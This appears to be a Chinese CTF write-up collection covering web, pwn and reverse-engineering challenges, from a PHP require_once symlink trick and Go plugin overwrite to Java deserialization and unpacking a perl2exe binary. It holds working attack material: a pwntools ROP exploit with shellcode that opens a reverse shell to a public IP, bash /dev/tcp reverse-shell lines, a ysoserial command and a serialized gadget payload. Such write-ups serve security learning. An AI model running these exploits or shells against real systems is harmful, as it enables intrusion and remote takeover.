### 非预期 

删ssl没删完全，可以利用_ssl模块，自己实现ssl.py的功能，实现ssl，实现mysql客户端。 

In a hurry, I didn't delete the _ssl module(requires recompiling python and not selecting the ssl module), it is possible to implement ssl.py and make ssl mysql client in python. 

![图片](https://uploader.shimo.im/f/rIi2TdxZeW1INAHh.png!thumbnail)

```plain
原本题目是没有SSL的，突然想到mysql有密码了虽然不能重放但是有python的mysql客户端实现（知乎上有），就当场加了一个用户需要SSL的限制，并且给ssl.py删了，但是删python ssl底层实现_ssl需要重新编译，我来不及整 了 ，我爪巴。 
这个题主要考点就是python里实现reGeorg隧道服务端，之前SCTF里Login me again有用到将reGeorg给出的jsp服务端稍加修改放到Java class里注册成filter进行注入的，在python/flask里注入比tomcat要简单，直接from flask import current_app as app;@app.route 动态注册一个路由就行了。在python里实现reGeorg隧道基本就是照着jsp的抄抄，把java socket和tomcat的东西翻译成python socket和flask（我的实现没用flask session，用flask session存储隧道id应该没有问题，存socket存不进去）。我觉得大师傅可能十分钟就改完了，所以加了个改host，用原版reGeorg客户端改host在建立连接的地方会改host不成功，这个手写的反向代理又一直返回200，可能导致调试困难。没想到各位师傅都去手撕ssl mysql了，呜呜呜我爪巴。 
```
## Make PHP Great Again 

```plain
PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。更详细的源码分析之后补上。 

 Payload: 

http://cefiejf3iofj3s.c.zhaoj.in/?file=php://filter/read=convert.base64-encode/resource=file:///proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php 
```
## gogogo 

### Step 1 

>审计源码，发现可通过MySQL COLLATE在比较不同编码表数据时的隐式编码转换获取admin账号信息 

注册ａdmin用户，会返回Duplicate key，但因为未使用事务，所以成功插入了auth表 

正常登录ａdmin后表单里会返回密码hash，md5解密(密码admin123..)后登录admin用户 

### Step 2 

>源码中告知了go plugin两个导出函数签名，可读文件 or HTTP请求 
>通过读文件可搜寻必要信息（go version) 
>获知go version后可知该版本HTTP库存在CRLF注入，且后续编译go plugin需要保持版本相同 
>通过HTTP请求接口CRLF注入一个上传请求，访问到上传接口，上传覆盖plugins/base.so，达成代码执行 

使用题目相同的Go版本编译exp.go（或直接使用exp.so），修改exp.py中的Cookie，运行后成功覆盖base.so 

### Step3 

访问/admin/reload使服务重新加载plugin 

然后访问 

```plain
POST /admin/invoke 
fn=Req&arg=CMD 
```
即可RCE 
## base64 

这是cfgo-xx系列的第三题，推荐先看完pwn下面两题再来看这题。 

这题的两解都不算预期，因为之前的webpwn都具有文件读然后通过/proc/self/maps就能拿到libc、扩展so的基地址，这样很不好，所以让web关卡的出题队友设置了禁止/proc下的读取，但是没想到DefenitelyZer0通过软连接..//..//../..//dev/fd/../stat拿到了/proc的内容，2333333. ![图片](https://uploader.shimo.im/f/lH3sFh5R3SqiP5j4.png!thumbnail)

[https://ptr-yudai.hatenablog.com/entry/2020/08/03/120153#Web-952pts-base64-2-solves](https://ptr-yudai.hatenablog.com/entry/2020/08/03/120153#Web-952pts-base64-2-solves)

其次在找地址的过程中，由于apache的进程都是fork出来的，pie地址在重启apache服务前不会改变，所以两队都采用的brute-forcing的方法找到了栈上局部变量的位置（null连so的基地址也是爆破的）。。。。。。下次一定要写个cron定期service apache2 restart一下。 

>下面是wp 

首先为了搞懂漏洞点我们需要拿到so文件，这里有两种路线： 


1. 通过web关卡，读文件拿到，路径就是ubuntu 19.04中apt install php-dev后的默认路径/usr/lib/php/20170718/ 。web关卡也很简单，限制了50长度，对目录层数进行了检测，源码如下。 
```plain
    function dir_count($filename){ 
$depath = 0; 
foreach (explode('/', $filename) as $part) { 
if ($part == '..') { 
$depath--; 
} elseif ($part != '.') { 
$depath++; 
} 
} 
return $depath; 
} 

if ($_GET['filename']!=NULL) { 
$filename=$_GET['filename']; 
if(strlen($filename)>50){ 
die("You're over the limit"); 
} 
$filename=preg_replace("/(flag)|(proc)|(self)|(maps)/i","w&m",$filename); 
if(dir_count($filename)>0){ 
echo file_get_contents('./hint/'.$filename); 
} 
else { 
echo "You're over the limit"; 
} 
} 
```
2. 不断利用栈溢出，找到slice结构体的位置，覆盖array、len、cap达到任意读的目的，然后不停leak直到把so dump出来，这样其实就可以无视web关卡变成纯pwn游戏了 （理论可行） 

通过分析so可以看到base64解码正常时是没有任何漏洞的，而且还限制了输入长度。当base64解码过程发生异常的时候，会在返回结果前面塞一坨ascii字符画大概100多bytes，然后再把异常前解码出来的内容memcpy到其后面，这里会造成一个栈溢出。触发异常的话只要在正常base64后面加一个简简单单的字符就行，比如base64.b64encode(data)+'a'。由于最后我们溢出的局部变量buf是作为返回值返回到网页的，所以只要通过gdb调试找到 局部变量buf在栈上的偏移，改掉array、len、cap就能实现任意读了，我们可以： 


1. 通过 0xc000000030找到扩展so的基地址 
2. 通过扩展so的got表找到libc的基地址 
3. 通过部分写array指针的低地址为\x40找到stack地址（这道题不需要爆破的哦，通过调试是比较容易发现的） 
4. 然后rop调用mprotect给栈地址洗剪吹(rwx)一下，执行我们的shellcode，最后反弹shell到公网ip就行了 
```python
#-*- coding: utf-8 -*- 
from pwn import * 
import requests 
import urllib 

if len(sys.argv) > 1: 
    s = requests.session() 
else: 
    os._exit(1) 
__author__ = '3summer' 
binary_file = "./cfgoPHPExt_new.so" 
context.binary = binary_file 
context.terminal = ['tmux', 'sp', '-h'] 
# context.log_level = 'debug' 
elf = ELF("./cfgoPHPExt_new.so") 
libc = ELF('./libc-2.29.so') 
def send(data): 
    print hexdump(data) 
    # print repr(data) 
    # r = s.get('http://%s/test.php?enc=%s' % (sys.argv[1], urllib.urlencode({'a':base64.b64encode(data)})[2:]+'a') ) 
    r = s.post('%s' % sys.argv[1], data = {'text': base64.b64encode(data)+'a' } ) 
    print hexdump(r.content) 
    return r.content 

uu32    = lambda data               :u32(data.ljust(4, '\0')) 
uu64    = lambda data               :u64(data.ljust(8, '\0')) 
tmp = send( flat('A'*0x6c, 
            0xc000000030,8,8, 
            0xc000000030,8,8, 
        )   
    ) 
# tmp = tmp.split(') "')[1] 
elf.address = uu64(tmp[:6]) - 0x2a47c0 
success('elf base:0x%x' % elf.address) 
tmp = send( flat('a'*0x6c, 
            elf.got.free,8,8, 
            elf.got.free,8,8, 
        )   
    ) 
# tmp = tmp.split(') "')[1] 
libc.address = uu64(tmp[:6]) - libc.sym.free 
success('libc base:0x%x' % libc.address) 
tmp = send( flat('a'*0x6c, 
            'b'*0x18, 
            p8(0x40) 
        )   
    ) 
tmp = tmp.split('b'*0x18)[1] 
stack = uu64(tmp[:3]) + 0xc000000000 
success('stack base:0x%x' % stack) 
print hex(0x1701F1+elf.address) 

# libc 
pop_rdi = libc.address + 0x0000000000026542#: pop rdi; ret; 
pop_rsi = libc.address + 0x0000000000026f9e#: pop rsi; ret; 
pop_rdx = libc.address + 0x000000000012bda6#: pop rdx; ret; 
# 0x000000000012bdc9: pop rdx; pop rsi; ret; 
pop_rax = libc.address + 0x0000000000047cf8#: pop rax; ret; 
pop_rcx = libc.address + 0x000000000010b31e#: pop rcx; ret; 
pop_rbx_r12 = libc.address + 0x0000000000030e4c#: pop rbx; pop r12; ret; 
mov_rsi_rax = libc.address + 0x000000000008c77a#: mov qword ptr [rsi], rax; xor eax, eax; ret; 
mov_rdi_rcx = libc.address + 0x00000000000b54b6#: mov qword ptr [rdi], rcx; ret; 
# cfgo 
0x00000000000f9ba4#: mov rbp, rsp; and rsp, 0xfffffffffffffff0; call rax; 
0x00000000000f9b74#: mov rbx, rsp; and rsp, 0xfffffffffffffff0; call rax; 
cmd = '/bin/bash -c "bash -i >& /dev/tcp/134.175.2.73/2333 0>&1"\x00' 
sc = \ 
'''mov rdi, 0x%x\nmov rax, 0x%x\nmov rsp, 0xc000006000\npush rax\npush rax\nret''' % (stack+0x6c, libc.sym.system) 
print disasm(asm(sc)) 
shellcode = cmd + asm(sc) 
# send( flat(cmd.ljust(0x6c,'\x00'), 
send( flat(shellcode.ljust(0x84,'\x90'), 
            0xc000000000,8,8, 
            0xc000000000, 
            pop_rdi, 0xc000000000, 
            pop_rbx_r12, 0x123, 0x123, 
            pop_rdx, 7, 
            pop_rsi,  4000000 , 
            libc.sym.mprotect, stack+0x6c+len(cmd), 
        )   
    ) 
```
最后说几句： 

1. 使用 [https://github.com/kitech/php-go](https://github.com/kitech/php-go)开发，感兴趣可以尝试 
2. 本地调试可以这样去做（或者要用pwntools的process）php -d extension=./cfgoPHPExt.so -a 
3. 部署到apache后，ps -ef可以看到大概5、6个apache进程，我们不能确定下次访问是哪个进程处理我们的请求，如果需要调试可以这样做：先随便 gdb attach一个，设置好断点，然后c跑起来。另外一边不断用脚本去发送请求，大概10次左右gdb就能断下来了 
4. 最后附上docker文件 
```python
FROM ubuntu:19.04 
ENV DEBIAN_FRONTEND=noninteractive 
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco main restricted" > /etc/apt/sources.list 
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco-updates main restricted" >> /etc/apt/sources.list 
RUN echo "deb http://old-releases.ubuntu.com/ubuntu disco-security main restricted" >> /etc/apt/sources.list 
RUN apt update && apt install -y apache2 php-dev libapache2-mod-php 
ADD --chown=root:root cfgoPHPExt_new.so /usr/lib/php/20170718/ 
ADD --chown=root:root html /var/www/html 
RUN echo "extension=cfgoPHPExt_new.so" >> /etc/php/7.2/apache2/php.ini 

ADD --chown=root:www-data readflag /readflag 
ADD --chown=root:root flag /flag 
RUN chmod 750 /readflag && chmod u+s /readflag && chmod 400 /flag 
EXPOSE 80 
CMD exec /bin/bash -c "service apache2 restart; trap : TERM INT; sleep infinity & wait" 
```
## Easy coherence 

打开题目，首先看到是个表单。提交抓包看看。 

 ![图片](https://uploader.shimo.im/f/dT8NkyZvTqtARXhY.jpg!thumbnail)

```plain
POST /read HTTP/1.1 
Host: easycoherenc.wmctf.wetolink.com 
Content-Length: 1752 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Origin: http://easycoherenc.wmctf.wetolink.com 
Content-Type: application/x-www-form-urlencoded 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Referer: http://easycoherenc.wmctf.wetolink.com/ 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8 
Connection: close 
name=test&mail=aaa%40qq.com&phone=11111111111&content=aaaaaa&object=rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0%2FBbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAB1cr%2Bur4AAAAzABwBAA41Mzk2ODc4MDk4MDg4MgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQATNTM5Njg3ODA5ODA4ODIuamF2YQEACDxjbGluaXQ%2BAQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BAA9Hb29kIGpvYiBtYW4uLi4IABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEADVN0YWNrTWFwVGFibGUBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAXAQAGPGluaXQ%2BDAAZAAgKABgAGgAhAAIAGAAAAAAAAgAIAAcACAABAAkAAAAkAAMAAgAAAA%2BnAAMBTLgADxIRtgAVV7EAAAABABYAAAADAAEDAAEAGQAIAAEACQAAABEAAQABAAAABSq3ABuxAAAAAAABAAUAAAACAAZwdAABYXB3AQB4c30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQACGY1YTVhNjA4cQB%2BAAh4dnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHg%3D 
```
![图片](https://uploader.shimo.im/f/7rmk0TZgFvWfmDnm.jpg!thumbnail)

提交以后，发现object参数rO0AB字符Base64解码以后到16进制是AC ED 00 05，是java序列化数据，意味着此处是传入序列化数据后端可能会进行反序列化，从返回序列化数据来看是Jdk7u20的gadget。 

尝试cc链。 

java -jar ysoserial.jar CommonsCollections2 "ping 5rm6eg.dnslog.cn"|base64 

返回信息提示提交的数据有问题 

 ![图片](https://uploader.shimo.im/f/KOAS2NN4r6tACGVe.jpg!thumbnail)

编码下即可 

![图片](https://uploader.shimo.im/f/IkoGeE5BxkzliuEs.jpg!thumbnail)

 ![图片](https://uploader.shimo.im/f/h6Mkj67bDX0jRJw3.jpg!thumbnail)

 

但是dnslog没有收到请求， 

 ![图片](https://uploader.shimo.im/f/QtFjxOmB1PcbM2pE.jpg!thumbnail)

这里猜测可能gadget不对或题目是docker环境 考虑到无法执行ping等（之前做别的题遇到过），返回再来看题目首页，关键信息coherence，由于之前曝过coherence反序列化漏洞。 


1. 编写通用gadget，每个版本的coherence生成序列化suid不一样，就会导致反序列化失败。需要解决suid序列化不一致问题，否则序列化失败异常中断，无法执行命令。 
2. 大概有5、6个版本，且有的版本oracle官方不提供下载，题目没有提供是哪个版本的coherence，需要fuzz提交序列化数据，然后盲测gadget，看看哪个gadget可以反序列化成功去执行命令。 

反弹shell fuzz object参数 coherence gadget和其他链 

这里附上 [poc](https://github.com/Y4er/CVE-2020-2555)

 ![图片](https://uploader.shimo.im/f/i7J6Os2ydU9wN1SA.jpg!thumbnail)

`bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2000 0>&1` 

fuzz 

![图片](https://uploader.shimo.im/f/WvECVZsAGjXT1gbU.jpg!thumbnail)

发现非200的应该是执行成功的，response body中没有输出序列化数据。 

 ![图片](https://uploader.shimo.im/f/cWAfxcn67WuYgJjM.jpg!thumbnail)

这就很坑了 2333。 

![图片](https://uploader.shimo.im/f/k4klATcOdkYnaLY5.jpg!thumbnail)

最后得flag 

WMCTF{70bc3a47c999f11b81db65701274ff2b} 

## Nobody Knows BaoTa Better Than Me 

该题涉及多个0day漏洞，将在周五晚B站直播中做详细解答 

#  **Reverse：** 

## easy_re 

如果不用od来做的话   是一个很有意思的题，这里给了一个纯ida 静态分析的做法 

### 第一步：确定资源文件位置并解密 

前置知识点： 

将perl打包成exe文件，只要让exe运行时加载起来配置好perl的运行库，那就可以让exe运行perl代码,那么本道赛题的核心目的就应该是分析exe加载过程，找到perl代码，解出flag。 

首先64位程序，ida打开逆向分析main函数 

![图片](https://uploader.shimo.im/f/W3SgGy2r6G8JrDEB.png!thumbnail)

![图片](https://uploader.shimo.im/f/YteohLxfNAU5rTRO.png!thumbnail)

上面一部分的函数主要是获取文件环境，以及main函数参数，注释有init的地方是初始化，exe运行perl代码肯定需要配置好perl环境，所以初始化的地方是重要的，下面一部分是直接run执行以及程序的释放内存的处理代码。那么关键点就是初始化和运行部分了。 

那么先看初始化的函数： 

![图片](https://uploader.shimo.im/f/kie7vBnpLIGdFiZr.png!thumbnail)

上面全是初始化的过程，但是在这个函数中有着一个paperl的输出，这样子应该就是在初始化perl的运行环境了，那么继续往下看 

![图片](https://uploader.shimo.im/f/rAyrUHwDwGm4xDpq.png!thumbnail)

在这个sub_40F730函数中，为paperl创建了一个0x7C0的堆区空间，并且初始化为0，然后，根据报错信息，我们可以知道bfs节段无法被找到，那么就代表，sub_406BF0函数,就是在寻找bfs节区，我们进入到该函数 

![图片](https://uploader.shimo.im/f/LtzdfocnSmHSDKZV.png!thumbnail)

在这里，我们发现一个关键函数，就是FindResourceA函数，根据百度的理解，这个函数拥有查找资源的功能，那么这里如果有人曾经用过查找资源的软件：Resource Hacker，就可以直接使用该软件找到BFS相关的资源。 

这里的FindResourceA，LoadResource，LockResource三个函数常常是组合在一起使用的，用来寻找到资源以及定位资源，数据结构如下： 

![图片](https://uploader.shimo.im/f/Mh97thr8POyGnuOE.png!thumbnail)

最左边的指针就代表了资源文件的起始字符串magic字符串的位置点。这类思想，在固件解包分析中比较常用，虽然被应用到了windows64位程序上，但是定位资源文件原理是一样的。 

>其中0x200000这个数据总是会被比较，是因为对于不同操作系统内容来说，有些可执行文件的载入是大端序，有些是小端序，所以常常设置标志位0x200000作为文件的标识，用来识别大端序和小端序 

![图片](https://uploader.shimo.im/f/b2CpxRIFaigVERhd.png!thumbnail)

并且在查找资源后，有一段校验的函数代码，这里是更加核心的确认了资源文件的位置。 

这个函数的主要功能就是找到，文件的开始部分，进行校验，然后找到文件头，最后将文件头之后的数据和偏移第8位的4个字节进行异或操作，那么这里就是第一重解密，资源文件会根据某一个字符串进行异或，并且加载在堆区中。 

资源文件文件头结构如下： 

![图片](https://uploader.shimo.im/f/8pCvZH4MazHF0ZWX.png!thumbnail)

0-4： 文件标识位置，文件头 

4-8： 文件小端序大端序标识 

8-12： 被异或的数据也是整个资源文件的长度 

12-16： 文件头的长度 

那么解密代码如下： 

```plain
def decypt_perl_code_bin_xor(perl_code_bin): 
    perl_code_bin_total_len = struct.unpack('<I',perl_code_bin[8:12])[0] 
    # print "perl_code_bin_total_len is %s" % hex(perl_code_bin_total_len) 
    perl_code_bin_header_len = struct.unpack('<H',perl_code_bin[12:14])[0] 
    # print "perl_code_bin_header_len is %s" % hex(perl_code_bin_header_len) 
    perl_code_bin_data_len = perl_code_bin_total_len - perl_code_bin_header_len 
    # print "perl_code_bin_data_len is %s" % hex(perl_code_bin_data_len) 
    perl_code_orig =  perl_code_bin[perl_code_bin_header_len:perl_code_bin_total_len] 
    if perl_code_orig == "": 
        print "decypt_perl_code_bin_xor: perl_code_orig error" 
        return 0 
    i = 0 
    decypt_xor_data = '' 
    while(i < perl_code_bin_data_len): 
        t = struct.unpack('<I',perl_code_orig[i:i+4])[0] ^ struct.unpack('<I',perl_code_bin[8:12])[0] 
        decypt_xor_data = decypt_xor_data + struct.pack('I', t) 
        i = i + 4 
    with open('bfs_file', 'ab') as fout: 
      fout.write(decypt_xor_data) 
    return decypt_xor_data 

fd = open(filename, 'rb') 
orig_data = fd.read() 
fd.close() 
if orig_data[0x138F50:0x138F54] == '\xBC\x55\x21\xAB': 
    # print struct.unpack('<I', orig_data[0x138F50:0x138F54])[0] 
    print '[+] Found End Magic' 
else: 
    print '[-] Not Found End Magic' 
    return False 
perl_code_bin_total_len = struct.unpack('<I', orig_data[0x138F58:0x138F5C])[0] 
if orig_data[0x138F50-perl_code_bin_total_len:0x138F54-perl_code_bin_total_len] == '\x7F\x3A\x5B\xAA': 
    print '[+] Found Begin Magic' 
else: 
    print '[-] Not Found Begin Magic' 
    return False 
xor_perl_code_bin = orig_data[0x138F50-perl_code_bin_total_len:0x138F50] 
# print "bin len is %s" % hex(perl_code_bin_total_len) 
if xor_perl_code_bin == "": 
    print "error" 
print '[+] Decypt 1st for perl_code_bin' 
# print xor_perl_code_bin 
perl_code_bin = decypt_perl_code_bin_xor(xor_perl_code_bin) 
if perl_code_bin == "": 
    print "error" 
return 0 
```
那么继续分析发现，导出的数据的，头部，正好是BFS，那么这里就确认了，大概perl的资源文件位置就会在这里。 
![图片](https://uploader.shimo.im/f/2Dujvub9dRsI9rto.png!thumbnail)

### 第二步： 分析数据结构并解密得到文件列表 

继续往下分析,上面已经得到了部分的被加密的资源文件，并且它存放在堆区之中。回到sub_40F730的函数中，上面的bfs选定节段已经分析完了，没啥东西了，下面这个函数，看参数runlib，猜测是载入库的过程，那么开始看吧 

![图片](https://uploader.shimo.im/f/wBlmGha0zV0XDrEF.png!thumbnail)

进入到sub_40D1A0函数中： 

![图片](https://uploader.shimo.im/f/V6ej7GXJX31n4Vky.png!thumbnail)

根据注释，我们可以理解到，后面有个extract提取的过程，但是先不能着急，先把上面的函数分析完。。。 

在sub_407290函数中，在这个函数中，会创建一个结构体，并且导出（结构体结构，后续分析），经过比较长时间的分析，我们会发现，我们之前导出的资源文件是这样子的数据结构 

![图片](https://uploader.shimo.im/f/R3q1ezsbcab34AkM.png!thumbnail)

0-4： 文件头标识 

4-8： 文件小端序大端序标识 

8-12： 整个文件的长度 

12-16： 结尾标志 

16-20： 标志位控制程序流程 

20-22： 这两个字节代表了文件头长度，也就是0x20个字节 

22-24：标志位 

24-28：文件列表长度 

28-32：结尾标志 

那么我们进入到while循环的sub_406FB0函数分析一波： 

发现程序就经过异或判断，来判断数据是否已经真实载入内存了。所以我们异或测试一波，会发现文件列表会是这样子的结构体。 

我们发现，从0x20开始的数据，会通过异或0xEA，将一个一个文件给剥离出来： 

每个文件数据结构如下： 

![图片](https://uploader.shimo.im/f/0JWnbsl42MhGXmOt.png!thumbnail)

0-2： 文件名称长度为7 

2-9： 文件名称（这里根0-2字节确定文件名称长度） 

9-12： 被#填充（这个填充字节长度根据4个倍数来判断） 

12-16：文件的结构体的标识位，代表真实文件。例如：第一个文件Carp.pm的压缩包的文件头（为什么是压缩包，这个后面讲解） 

找到文件列表的代码如下： 

```plain
def extract_files_list(files_tables, files_tables_len): 
    print hex(files_tables_len) 
    i = 0 
    files_list = [] 
    while(i < files_tables_len): 
        filename_len = struct.unpack('<H', files_tables[i:i+2])[0] 
        # print hex(filename_len) 
        j = 0 
        filename = '' 
        while(j != filename_len): 
            filename += struct.pack('B', (ord(files_tables[i+2+j:i+2+j+1]) ^ 0xEA)) 
            j = j + 1 
        k = 0 
        # print filename 
        if (filename_len+2) % 4 != 0: 
            k = 4 - ((filename_len+2) % 4) 
        # while(files_tables[i+2+filename_len+k] == '#'): 
        #   k = k + 1 
        filedata_offset = struct.unpack('<I', files_tables[i+2+filename_len+k:i+2+filename_len+k+4])[0] 
        # print filename_len 
        # print filename 
        print filename_len, filename, hex(filedata_offset) 
        files_list.append([filename_len,filename,filedata_offset]) 
        i = i + 2 + filename_len + k + 4 
    return files_list 
file_offset = struct.unpack('<H', perl_code_bin[20:22])[0] 
    files_tables_end_offset = struct.unpack('<I', perl_code_bin[24:28])[0] 
    files_tables = perl_code_bin[file_offset:files_tables_end_offset] 
    files_list = extract_files_list(files_tables, files_tables_end_offset-32) 
```
文件列表如下：长度 文件名 文件索引 
 ![图片](https://uploader.shimo.im/f/QKI8KACmcF7Xd1Oo.png!thumbnail)

### 第三步：根据文件列表并解压或者解密出文件 

回到之前，这个程序会返回一个结构体到最后一个参数，然后会被sub_406D40函数调用。。。当我们分析完sub_406D40函数之后，我们可以知道： 

其实就是真实文件的文件结构体： 

![图片](https://uploader.shimo.im/f/qbaPylLOVjvK8XxP.png!thumbnail)

从第一个例子开始分析，也就是从0x3B4位置开始分析,我们可以得知： 

0 0x00 -->  file_len   // orignal file len 

1 0x04 -->  compress_len  // if decypt_method==0x02, compress_len = file_len 

2 0x08 -->  decypt_method  // 0x03 --> uncompress,  0x02 --> just XOR 0xEA 

3 0x0c -->  data 

![图片](https://uploader.shimo.im/f/RnlGzMHF9D3PjMSS.png!thumbnail)

![图片](https://uploader.shimo.im/f/LmRzZOHTpKwHKWh5.png!thumbnail)

结合上面两个图，我们发现在sub_406D40函数中，会根据结构体的第三个参数，来判定是解压缩还是异或，为什么我知道是zlib解压缩呢？因为之前我用c写过zlib的代码，第二个参数是很标准的1.2.8代表，是zlib的inflateInit_函数的第二个参数。 

ok那么这一步，就是将文件解压或者用异或解密出来的代码： 

```plain
def extract_files(input_file,files_list, perl_code_bin): 
    i = 0 
    while(i < len(files_list)): 
        filename = files_list[i][1] 
        filedata_offset = files_list[i][2] 
        filedata_dec_len = struct.unpack('<I', perl_code_bin[filedata_offset:filedata_offset+4])[0] 
        filedata_enc_len = struct.unpack('<I', perl_code_bin[filedata_offset+4:filedata_offset+8])[0] 
        filedata_dec_method = struct.unpack('<I', perl_code_bin[filedata_offset+8:filedata_offset+12])[0] 
        if (filedata_dec_len == filedata_enc_len) and (filedata_dec_method == 0x02): 
            print '[+] XOR  -->  {}'.format(filename) 
            j = 0 
            filedata = '' 
            while (j != filedata_dec_len): 
                filedata += struct.pack('B', (ord(perl_code_bin[filedata_offset+12+j:filedata_offset+12+j+1]) ^ 0xEA)) 
                j = j + 1 
            filename = filename.replace('*','_').replace('<','-') 
            if not os.path.exists('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")): 
                os.makedirs('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")) 
            if '/' in filename and not os.path.exists('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])): 
                os.makedirs('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])) 
            fd = open('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\')), 'wb+') 
            fd.write(filedata) 
            fd.close() 
            i = i + 1 
        elif (filedata_dec_len != filedata_enc_len) and (filedata_dec_method == 0x03): 
            print '[+] ZLIB  -->  {}'.format(filename) 
            enc_filedata = perl_code_bin[filedata_offset+12:filedata_offset+12+filedata_enc_len] 
            dec_filedata = zlib.decompress(enc_filedata) 
            j = 0 
            filedata = '' 
            while (j != filedata_dec_len): 
                filedata += struct.pack('B', (ord(dec_filedata[j:j+1]) ^ 0xEA)) 
                j = j + 1 
            filename = filename.replace('*','_').replace('<','-') 
            if not os.path.exists('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")): 
                os.makedirs('.\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe")) 
            if '/' in filename and not os.path.exists('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])): 
                os.makedirs('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\').rsplit('\\',1)[0])) 
            fd = open('.\\{}\\{}'.format(os.path.splitext(os.path.basename(input_file))[0] + "_exe", filename.replace('/','\\')), 'wb+') 
            fd.write(filedata) 
            fd.close() 
            i = i + 1 
        else: 
            print '[-] Unknow  -->  {}'.format(filename) 
            i = i + 1 

    return True 
ret = extract_files(filename, files_list, perl_code_bin) 
```
但是大家可以看看为什么我代码中在解压之后，还会异或一次0xEA呢？ 
>如果大家没有异或0xEA的话， 其实解压缩出来还是乱码。。。 

这一段异或，其实是在main函数的run的部分（我在最上面的截图里面有注释），因为run部分要讲解起来很麻烦，太多了，这里，建议可以直接脑洞异或0xEA，解压缩出来的数据很多都是0xEA，所以可以作为脑洞。 

### 完整exp 

```plain
#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
import os 
import struct 
import sys 
import zlib 
import binascii 
def decypt_perl_code_bin_xor(perl_code_bin): 
    perl_code_bin_total_len = struct.unpack('<I',perl_code_bin[8:12])[0] 
    # print "perl_code_bin_total_len is %s" % hex(perl_code_bin_total_len) 
    perl_code_bin_header_len = struct.unpack('<H',perl_code_bin[12:14])[0] 
    # print "perl_code_bin_header_len is %s" % hex(perl_code_bin_header_len) 
    perl_code_bin_data_len = perl_code_bin_total_len - perl_code_bin_header_len 
    # print "perl_code_bin_data_len is %s" % hex(perl_code_bin_data_len) 
    perl_code_orig =  perl_code_bin[perl_code_bin_header_len:perl_code_bin_total_len] 
    if perl_code_orig == "": 
        print "decypt_perl_code_bin_xor: perl_code_orig error" 
        return 0 
    i = 0 
    decypt_xor_data = '' 
    while(i < perl_code_bin_data_len): 
        t = struct.unpack('<I',perl_code_orig[i:i+4])[0] ^ struct.unpack('<I',perl_code_bin[8:12])[0] 
        decypt_xor_data = decypt_xor_data + struct.pack('I', t) 
        i = i + 4 
    # with open('bfs_file', 'ab') as fout: 
    #   fout.write(decypt_xor_data) 
